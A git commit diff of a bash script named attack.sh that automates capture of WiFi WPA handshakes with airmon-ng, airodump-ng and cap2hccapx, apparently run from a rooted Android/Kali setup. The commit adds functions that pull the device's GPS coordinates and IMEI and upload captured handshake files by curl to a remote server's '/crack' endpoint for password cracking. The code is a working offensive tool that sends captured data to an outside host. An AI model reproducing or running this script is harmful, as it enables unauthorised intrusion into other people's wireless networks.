62733fe76f8811bbc234fed50ed90b6a0fc2ef03
rinamuka <58566654+rinamuka@users.noreply.github.com>
2021-08-22 21:16:58 +0300

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -12,7 +12,7 @@ checkUtils(){
 
                 printf "airmon-ng....\033[32m Done\033[0m\n"
         else
-                printf "airmon-ng....\033[31m Fail \033[0m\n"
+                printf "airmon-ng....\033[31mFail\033[0m\n"
                 exit 1
         fi
 
@@ -21,7 +21,7 @@ checkUtils(){
         if [[ "$output" == *"usage: airodump-ng"* ]]; then
                 printf "airodump-ng....\033[32m Done\033[0m\n"
         else
-                printf "airodump-ng....\033[31m Fail \033[0m\n"
+                printf "airodump-ng....\033[31m Fail\033[0m\n"
                 exit 1
         fi
 
@@ -30,7 +30,7 @@ checkUtils(){
         if [[ "$output" == *"usage: cap2hccapx input.pcap output.hccapx"* ]]; then
                 printf "cap2hccapx....\033[32m Done\033[0m\n"
         else
-                printf "cap2hccapx....\033[31m Fail \033[0m\n"
+                printf "cap2hccapx....\033[31m Fail\033[0m\n"
                 exit 1
         fi
 
@@ -41,11 +41,49 @@ checkUtils(){
 checkServer(){
         curl http://$serverAddr/handshakes &> /dev/null
         if [[ $? == 0 ]]; then
-                printf "Server status - \033[32m working \033[0m\n"
+                printf "Server status - \033[32mworking \033[0m\n"
         else
-                printf "Server status - \033[31m not working \033[0m\n"
+                printf "Server status - \033[31mnot working\033[0m\n"
                 exit 1
         fi
+}
+
+sendHandshake() {
+        long=$(chroot /proc/1/cwd/ dumpsys location | grep "LongitudeDegrees: " | awk -F' |,' '{print $16}')
+        echo "Long: "$long
+        lat=$(chroot /proc/1/cwd/ dumpsys location | grep "LatitudeDegrees: " | awk -F' |,' '{print $13}')
+        echo "Lat: "$lat
+        imei=$(chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]')
+        echo "IMEI: "$imei
+        curl -i -X POST  -H "Content-Type: multipart/form-data" -F "file=@$1" http://$serverAddr/crack
+        if [[ $? == 0 ]]; then
+                rm $1
+        else
+                echo "Failed send file $1"
+        fi
+}
+
+checkHandshakes() {
+        printf "\n"
+        echo "Check handshakes..."
+        output=$(cap2hccapx /home/kali/hscollector/shakes-01.cap /home/kali/hscollector/cleanshakes.hccapx)
+        echo $output
+        if [[ "$output" == *"Written 0"* ]] || [[ "$output" == *"Networks detected: 0"* ]]; then
+                echo "No handshakes"
+                rm /home/kali/hscollector/cleanshakes.hccapx >/dev/null
+        else
+                printf "\033[32mHandshakes detected!!!\033[0m\n"
+                time=$(date +%s)
+                if [[ -d /home/kali/hscollector/shakes ]]; then
+                        mv /home/kali/hscollector/cleanshakes.hccapx /home/kali/hscollector/shakes/shake-$time
+                else
+                        mkdir /home/kali/hscollector/shakes
+                        chmod 777 -R /home/kali/hscollector/shakes
+                        mv /home/kali/hscollector/cleanshakes.hccapx /home/kali/hscollector/shakes/shake-$time
+                fi
+                sendHandshake /home/kali/hscollector/shakes/shake-$time
+        fi
+
 }
 
 active() {
@@ -62,7 +100,7 @@ active() {
           if [[ $bssid == "BSSID" ]];then
                   continue
           fi
-          if [[ $power -lt -60 ]]
+          if [[ $power -lt -65 ]]
           then
                   continue
           fi
@@ -79,9 +117,10 @@ active() {
                   continue
           fi
           sleep 20
-          kill -9 $pid
-          rm /home/kali/hscollector/shakes-* >/dev/null
+          kill -9 $pid &>/dev/null
+          checkHandshakes
   done < <(tail -n +2  /home/kali/hscollector/shakesCollector-01.csv)
+  rm /home/kali/hscollector/shakes* >/dev/null
 }
 
 getparams(){
@@ -94,25 +133,24 @@ getparams(){
                 exit 1
         fi
         command=${REPLY}
-        if [[ ${REPLY} == 1 ]] || [[ ${REPLY} == 2 ]] ;then
+        if [[ $command == 1 ]] || [[ $command == 2 ]] ;then
                 if [[ $interface != "" ]];then
                         if [[ $command == 1 ]];then
                                 active
+                                getparams
                         fi
                         if [[ $command == 2 ]];then
                                 passive
                         fi
                 else
-
-
                         printf "Please set the wireless interface(e.g. wlan0):\n"
                         read;
                         interface=${REPLY}
                         output=$(airmon-ng start $interface)
                         if [[ "$output" == *"monitor mode vif enabled for"* ]] || [[ "$output" == *"monitor mode already enabled"* ]]; then
-                                printf "Monitor mode on $interface \033[32m ....Enabled \033[0m\n"
+                                printf "Monitor mode on $interface \033[32m....Enabled\033[0m\n"
                         else
-                                printf "Monitor mode failed enable on $interface \033[31m .... Fail \033[0m\n"
+                                printf "Monitor mode failed enable on $interface\033[31m ....Fail\033[0m\n"
                                 exit 1
                         fi
 
@@ -120,6 +158,14 @@ getparams(){
                         read;
                         serverAddr=${REPLY}
                         checkServer
+
+                        if [[ $command == 1 ]];then
+                                active
+                                getparams
+                        fi
+                        if [[ $command == 2 ]];then
+                                passive
+                        fi
                 fi
 
         else if [[ ${REPLY} == 3 ]];then
@@ -127,9 +173,9 @@ getparams(){
                 read;
                 serverAddr=${REPLY}
                 checkServer
+
         fi
         fi
-        getparams
 
 }
 
